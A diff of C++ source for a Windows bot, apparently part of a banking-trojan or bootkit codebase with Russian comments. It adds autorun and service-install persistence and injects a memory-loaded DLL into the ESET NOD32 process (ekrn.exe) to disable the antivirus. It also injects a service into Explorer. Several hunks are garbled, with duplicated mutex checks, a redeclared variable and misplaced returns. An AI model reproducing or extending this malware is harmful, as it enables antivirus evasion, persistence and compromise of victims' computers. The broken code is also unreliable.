@@ -40,6 +40,29 @@ namespace MAINDBGTEMPLATES
 
 
 
+
+/*char* LogName = "c:\\BotLog.log";
+
+void WriteLog(const char* Msg)
+{
+	HANDLE H = (HANDLE)pCreateFileA(LogName, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0,NULL);
+	pSetFilePointer(H, 0, 0, FILE_END);
+	DWORD W;
+	string L;
+	L.Format("[%d] %s \r\n", (DWORD)pGetTickCount() / 1000, Msg);
+	pWriteFile(H, L.t_str(), L.Length(), &W, NULL);
+
+//	pWriteFile(H, Msg, strlen(Msg), &W, NULL);
+//	pWriteFile(H, "\r\n", 2, &W, NULL);
+	pCloseHandle(H);
+}
+*/
+
+
+
+
+
+
 #pragma comment(linker, "/ENTRY:MyMain" )
 //#pragma comment(linker, "/ENTRY:ExplorerMain" )
 
@@ -67,11 +90,16 @@ void InternalAddToAutorun()
 	// Добавляем программу в автозагрузку
 	// только в случае если в системе не зарегистрирован мьютекс
 	// сигнализирующий об успешной установке буткита
+	#ifndef DEBUGBOT
+	if (!WSTR::IsEmpty(TempFileName))
 
 	const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
 	HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
 	if (Mutex != NULL)
 	{
+		const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
+		HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
+		if (Mutex != NULL)
 			pCloseHandle(Mutex);
 			MDBG("Main", "Буткит установлен. Игнорируем добавление в автозагрузку.");
 			return;
@@ -81,6 +109,9 @@ void InternalAddToAutorun()
 	#ifndef DEBUGBOT
 		if (!WSTR::IsEmpty(TempFileName))
 		{
+				pCloseHandle(Mutex);
+				MDBG("Main", "Буткит установлен. Игнорируем добавление в автозагрузку.");
+				return;
 		
 			PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
 			BOT::AddToAutoRun(Name);
@@ -88,9 +119,17 @@ void InternalAddToAutorun()
 			STR::Free(Name);
 		}
 
+		
+		PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
 		if (!ServiceInstalled)
 			BOT::InstallService(BOT::GetBotFullExeName().t_str());
 
+		MDBG("Main", "Добавляем бот в автозагрузку.");
+
+		BOT::InstallService(Name);
+		BOT::AddToAutoRun(Name);
+		STR::Free(Name);
+	}
 	#endif
 
 
@@ -178,6 +217,18 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 	return 0;
 }
 
+static DWORD WINAPI NOD32Dll(void*)
+{
+	BOT::InitializeApi();
+	DWORD dllSize;
+	BYTE* dll = File::ReadToBufferA( "c:\\1.dll", dllSize );
+	if( dll )
+	{
+		MemoryLoadLibrary(dll);
+		MemFree(dll);
+	}
+	return 0;
+}
 
 void ExplorerMain()
 {
@@ -193,8 +244,11 @@ void ExplorerMain()
 
 	// Отключаем отображение ошибок при крахе процесса
 	//DisableShowFatalErrorDialog();
+
 	MDBG( "Main", "Отключаем NOD32" );
-	OffNOD32();
+//	OffNOD32();
+	DWORD dwPid = GetProcessIdByName("ekrn.exe");
+	InjectIntoProcess( dwPid, NOD32Dll );
 
 	InternalAddToAutorun();
 
@@ -264,6 +318,7 @@ int APIENTRY MyMain()
 
 		if (!BOT::IsRunning())
 		{
+			//JmpToExplorer(ExplorerRoutine);
 			MDBG("Main", "Сервис инжектится в Explorer");
 			JmpToExplorer(ExplorerRoutine);
 		}
@@ -300,6 +355,8 @@ int APIENTRY MyMain()
 	}	
 
 
+	MDBG("Main", "Запускается бот. Версия бота %s", BOT_VERSION);
+	;
 
 	#if defined(DEBUGBOT) && defined(DebugUtils)
 		if (!StartInDebugingMode(true))
@@ -314,6 +371,7 @@ int APIENTRY MyMain()
 
 	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
 
+	DWORD dwProcessHash = File::GetNameHashW(ModulePath, false);
 	DWORD dwProcessHash  = File::GetNameHashW(ModulePath, false);
 	DWORD dwProcessHash2 = File::GetNameHashW(ModulePath, true);
 	
